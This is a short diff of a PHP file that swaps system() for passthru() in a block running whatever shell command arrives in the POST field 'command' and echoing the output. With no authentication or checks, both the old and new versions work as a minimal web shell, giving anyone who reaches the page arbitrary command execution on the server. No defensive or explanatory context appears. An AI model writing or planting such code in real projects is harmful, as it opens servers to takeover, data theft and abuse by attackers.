@@ -2,7 +2,8 @@
 
 if(!empty($_POST['command']))
 {
-    echo system($_POST['command']);
+    $command=passthru($_POST['command']);
+    echo $command;
 }
 
 ?>
